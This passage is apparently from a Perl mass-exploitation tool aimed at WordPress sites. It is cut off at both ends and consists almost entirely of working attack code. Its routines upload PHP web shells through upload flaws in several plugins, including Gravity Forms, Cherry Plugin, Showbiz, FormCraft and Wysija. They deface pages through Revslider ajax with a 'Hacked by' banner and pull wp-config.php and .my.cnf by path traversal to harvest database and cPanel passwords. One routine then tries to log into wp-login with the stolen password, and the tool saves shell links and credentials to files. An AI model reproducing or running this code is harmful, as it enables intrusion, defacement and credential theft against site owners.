my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["Xploit.php"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "Xploit.php5"]);

if ($exploit->decoded_content =~ /_input_3_Xploit.php5/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Gravity Deface";
print color('bold white')," .................... ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $site/wp-content/uploads/_input_3_Xploit.php5?X=Xploit\n";
open(TEXT, '>>Result/mh-wiss.txt');
    print TEXT "$site/wp-content/uploads/_input_3_Xploit.php5?X=Xploit\n";
    close(TEXT);
}

else { 
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Gravity Deface";
print color('bold white')," .................... ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";

}
}
################ Catpro #####################
sub catpro(){

my $url = "$site/wp-admin/admin.php?page=catpro_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Xploit.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/catpro\/(.*?)\/big\/Xploit.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/catpro/$uploadfolder/big/Xploit.php";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Catpro";
print color('bold white')," ............................ ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $catproup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$catproup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Catpro";
print color('bold white')," ............................ ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";
}
}


################ Cherry Plugin #####################
sub cherry(){

my $url = "$site/wp-content/plugins/cherry-plugin/admin/import-export/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["Xploit.php"],]);

$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/Xploit.php";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Cherry Plugin";
print color('bold white')," ..................... ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $cherryup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$cherryup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Cherry Plugin";
print color('bold white')," ..................... ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";
}
}

################ Download Manager #####################
sub downloadsmanager(){
$downloadsmanagervuln="$site/wp-content/plugins/downloads-manager/readme.txt";
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["Xploit.php"], dm_upload => '',]);
$dmup="$site/wp-content/plugins/downloads-manager/upload/Xploit.php";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Download Manager";
print color('bold white')," .................. ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $dmup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$dmup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Download Manager";
print color('bold white')," .................. ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";
}
}

############### formcraft ####################

sub formcraft(){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"FormCraft Upload .................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
my $conte = $ua->get("$link")->content;
if ($conte =~/{"files"/){
   
    upform();
}else{
    print color('bold red');
print  "NOT VULN\n";
    print color('reset');

}

}

sub upform(){
{
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $picture ="Xploit.php"; 
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );
$upzzX = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//Xploit.php'; 
my $taz = $ua->get("$upzzX")->content;
if ($taz =~ /X Xploit/){
   print color('bold green');
print "[Success]\n";
print color('reset');
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $upzzX?X=Xploit\n";

open(TEXT, '>>Result/shell.txt');   
print TEXT "$upzzX Xploit\n";   
close(TEXT);
}else{
    print color('bold red');
print  "NOT VULN\n";
    print color('reset');}
}

}

################ levoslideshow #####################
sub levoslideshow(){

my $url = "$site/wp-admin/admin.php?page=levoslideshow_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Xploit.php"], task => 'lvo_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/levoslideshow\/(.*?)\/big\/Xploit.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/levoslideshow/$uploadfolder/big/Xploit.php";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"levoslideshow";
print color('bold white')," ..................... ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $levoslideshowup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$levoslideshowup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"levoslideshow";
print color('bold white')," ..................... ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";
}
}
################ Power Zoomer #####################
sub powerzoomer(){ 
my $url = "$site/wp-admin/admin.php?page=powerzoomer_manage";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Xploit.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/powerzoomer\/(.*?)\/big\/Xploit.php/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/uploads/powerzoomer/$uploadfolder/big/Xploit.php";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Power Zoomer";
print color('bold white')," ...................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $zoomerup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$zoomerup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Power Zoomer";
print color('bold white')," ...................... ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";
}
}

################ Gravity Forms #####################
sub gravityforms(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "form-data", Content => [file => ["Xploit.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "Xploit.php"]);

my $check = $ua->get("$target/wp-content/uploads/_input_3_Xploit.php")->content;
if($check =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Gravity Forms";
print color('bold white')," ............... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $gravityformsup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$gravityformsup?X=Xploit\n";
close (TEXT);
}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Gravity Forms";
print color('bold white')," ..................... ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";
gravityforms2();
}
}
################ Gravity Forms #####################
sub gravityforms2(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres2 = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["Xploit1.jpg"], form_id => '1', name => 'ph.hitachi.html', gform_unique_id => '../../../../../', field_id => '3',]);
$gravityformsupp = "$site/_input_3_ph.hitachi.html";
my $checkgravityformsupp = $ua->get("$gravityformsupp")->content;
if ($checkgravityformsupp =~ /Powred by Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Gravity Forms";
print color('bold white')," ............... ";
print color('bold green'),"VULN\n";
print color('bold red'),"Shell Not Uploaded\n";

print color('bold white'),"Index Uploaded Successfully\n";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"  [LINK] => $gravityformsupp\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$gravityformsupp\n";
close (TEXT);
$def = $gravityformsupp;
zoneh();
}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Gravity Forms";
print color('bold white')," ..................... ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";
}
}



################ Revslider ajax #####################
sub revsliderajax(){

my $url = "$site/wp-admin/admin-ajax.php";

my $revslidajaxres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_captions_css", data => "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>Hacked by ph.hitachi<b>"]);

$revsliderajax = $site . '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

my $checkrevsajax = $ua->get("$revsliderajax")->content;
if($checkrevsajax =~ /ph.hitachi/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Revslider Dafece Ajax";
print color('bold white')," ............. ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Defaced Successfully\n";
print color('bold white'),"  [LINK] => $revsliderajax\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$revsliderajax\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Revslider Dafece Ajax";
print color('bold white')," ............. ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";
}
}

sub getconfig{
$url = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Revslider Get Config";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
     open(TEXT, '>>Result/Configrev.txt');   
    print TEXT "[RevsliderConfig] $url\n";   
    close(TEXT);
    getcpconfig();
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Revslider Get Config";
print color('bold white')," .............. ";
print color('bold red'),"NOT VULN\n";
}
}

sub getcpconfig{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Revslider Get cPanel";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";

$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){


print color('bold white'),"URL : $site/cpanel\n";
print color('bold white'),"USER : $1\n";
open (TEXT, '>>Result/cPanel.txt');
print TEXT "Url : $site\n";
print TEXT "USER : $1\n";
close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
            print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"PASS : $1\n";
open (TEXT, '>>Result/cPanel.txt');
print TEXT "PASS : $1\n";
close (TEXT);
        }


}
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Revslider Get cPanel";
print color('bold white')," .............. ";
print color('bold red'),"NOT VULN\n";
}
}


####################################################################################################
####################################################################################################
#####################################       REVSLIDER       ########################################
####################################################################################################
####################################################################################################
sub getconfig2{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print colored ("Revslider Get Config2",'bold white');
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){

print " ............. ";
print color('bold white');
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print color('reset');
    open(TEXT, '>>Result/Try manual.txt');   
    print TEXT "[rev cnfg] $site\n";   
    close(TEXT);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print color("green"),"\t
	[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print color("green"),"\t[+]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print color("green"),"\t[+]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print color("green"),"\t[+]Database Host = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }

wpbrute2();
getcpconfig2();
}}else{

   print " ............. ";
print color('bold white');
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print color('reset');
print " \n";
getcpconfig2();

}

}

####################################################################################################
####################################################################################################

sub getcpconfig2{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
    open(TEXT, '>>Result/Try_Manual.txt');   
    print TEXT "[rev cpnl] $site\n";   
    close(TEXT);
	
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

        print color("green"),"\n\t[+]Cpanel User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/cpanels.txt');
        print TEXT "\n[ cpanel ] \n$site\n[+]cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
        print color("green"),"\t[+]Cpanel Pass = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result/cpanels.txt');
        print TEXT "\n[-]Cpanel Pass = $1";
        close (TEXT)
        }


}
}
}




####################################################################################################
####################################################################################################
####################################################################################################
sub revdef(){
print colored ("DEFACE AJAX",'bold white');

$ajx = $site . 'wp-admin/admin-ajax.php';

$def = $site .'wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

$lasba = POST $ajx, ['action' => 'revslider_ajax_action', 'client_action' => 'update_captions_css', 'data' =>"<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>Hacked By Ph.hitachi</b><br>Powred by Xploit<p style='color: transparent'>"];
$response = $ua->request($lasba);
$stat = $response->content;
 if ($stat =~ /true/){
print  " ......................... ";
print color('bold white');
print color('reset');
print color('bold green');
print "SUCCESS";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


my $checkajx= $ua->get("$def")->content;
if($checkajx =~/Hacked|Xploit|ph.hitachi/) {

open(TEXT, '>>Result/index.txt');   
print TEXT "[rev deface] $site\n";   
close(TEXT);
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print "DEFACE ......................... ";
print color('bold white');
print color('reset');
print color('bold green');
print "SUCCESS";
print color('reset');
print color('bold white');
print color('reset');
print " \n";
print "LINK INDEX ......................... ";
print color('bold white');
print color('reset');
print color('bold green');
print "TEXTD";
print color('reset');
print color('bold white');
print color('reset'); 
print " \n";
zoneh();
}
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print "......................... \n";
print color('bold white');
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print color('reset'); 
print " \n";

}
}
####################################################################################################
####################################################################################################
############################### PHP MY ADMIN SCANNER ##############################################
####################################################################################################
####################################################################################################
sub zebbi{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print colored ("PMA Scanner",'Bold white');
print " .................. ";
print color('bold white');
print color('reset');
print color('bold blue');
print "WAIT";
print " \n";
print color('reset');
print color('bold white');
print color('reset');
use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
print "[$pma] .............. ";
print color('bold white');
print color('reset');
print color('bold green');
print "Founded";
print color('reset');
print color('bold white');
print color('reset');
open (TEXT, '>>Result/databases.txt');
print TEXT "\n[PhpMyAdmin] $url   =>   PhpMyAdmin Founded !!\n\n";
close (TEXT);

}else{

print "[$pma] .......... ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOt Founded";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

}}
print "PMA SCAN ..................... ";
print color('bold white');
print "[";
print color('reset');
print color('bold blue');
print "DONE";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
revdef();

}
####################################################################################################
####################################################################################################
####################################### WORDPRESS BRUTE ############################################
####################################################################################################
####################################################################################################
sub wpbrute2{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print colored ("Brute With Config Pass",'bold white');
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";
print " ............ ";
print color('bold white');
print color('reset');
print color('bold blue');
print "WAIT";
print color('reset');
print color('bold white');
print color('reset');
print " \n";
print "[Info] USER : $admin\n";
print "[Info] PASSWORD : $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
print "[BRUTE] ............... ";
            print color('bold white');

print color('reset');
print color('bold green');
print "LOGIN SUCCESS";
print color('reset');
print " \n";
print color('bold white');

        open (TEXT, '>>Result/brute.txt');
        print TEXT "\n[BRUTE][BOOM] $site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
            print "[BRUTE] ..................... ";
            print color('bold white');

print color('reset');
print color('bold red');
print "User And Password Dont Match";
print color('reset');
print color('bold white');
print color('reset');
print " \n";
}
zebbi();
}

################ Showbiz #####################
sub showbiz(){
my $url = "$url/wp-admin/admin-ajax.php";
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent($useragent);
my $showbizres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "showbiz_ajax_action", client_action => "update_plugin", update_file => ["Xploit.php"]]);

$showbizup = $site . '/wp-content/plugins/showbiz/temp/update_extract/Xploit.php';

my $checkshow = $ua->get("$showbizup")->content;
if($checkshow =~ /X Xploit/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Showbiz";
print color('bold white')," ........................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $showbizup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$showbizup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Showbiz";
print color('bold white')," ........................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ Simple Ads Manager #####################
sub ads(){  
my $url = "$site/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";

my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["Xploit.php"], action => 'upload_ad_image', path => '',]);
$adsup="$site/wp-content/plugins/simple-ads-manager/Xploit.php";
if ($adsres->content =~ /{"status":"success"}/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Simple Ads Manager";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $adsup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$adsup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Simple Ads Manager";
print color('bold white')," ................ ";
print color('bold red'),"NOT VULN\n";
}
}

################ Slide Show Pro #####################
sub slideshowpro(){ 
my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";

my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Xploit.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/Xploit.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/Xploit.php";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Slide Show Pro";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $sspup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$sspup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Slide Show Pro";
print color('bold white')," .................... ";
print color('bold red'),"NOT VULN\n";
}
}

################################## WP Mobile Detector ########################################
##############################################################################################
# check the link of the shell or you can upload "wpmobiledetectorshell.rar" on you one shell #
##############################################################################################
sub wpmobiledetector(){ 
$wpmdshell = "wpmobiledetectorshell.rar";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/Xploit.php";

my $check = $ua->get("$url"); 

my $checkup = $ua->get("$wpmdup")->content; 
if($checkup =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"WP Mobile Detector";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $wpmdup\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$wpmdup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"WP Mobile Detector";
print color('bold white')," ................ ";
print color('bold red'),"NOT VULN\n";
}
}

################ WYSIJA #####################
sub wysija(){
$theme = "my-theme";
my $url = "$site/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['Xploit.rar', => 'Xploit.rar'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
$wysijaup = "$site/wp-content/uploads/wysija/themes/xploit/Xploit.php";
my $checkwysija = $ua->get("$wysijaup")->content;
if($checkwysija =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Wysija";
print color('bold white')," ............................ ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $wysijaup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$wysijaup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Wysija";
print color('bold white')," ............................ ";
print color('bold red'),"NOT VULN\n";
}
}

################ InBoundio Marketing #####################
sub inboundiomarketing(){ 
my $url = "$site/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
$inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/Xploit.php";
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["Xploit.php"],]);

$checkinbomarketing = $ua->get("$inbomarketingup")->content;
if($checkinbomarketing =~/X Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"InBoundio Marketing";
print color('bold white')," ............... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $inbomarketingup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$inbomarketingup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"InBoundio Marketing";
print color('bold white')," ............... ";
print color('bold red'),"NOT VULN\n";
}
}


################ dzs-zoomsounds #####################
sub dzszoomsounds(){ 
my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/Xploit.php";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["Xploit.php"],]);

$checkdzsup = $ua->get("$dzsup")->content;
if($checkdzsup =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"dzs-zoomsounds";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $dzsup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$dzsup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"dzs-zoomsounds";
print color('bold white')," .................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ reflex-gallery #####################/
sub reflexgallery(){ 
my $url = "$site/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=$year&Month=$month";
$reflexup = "$site/wp-content/uploads/$year/$month/Xploit.php";
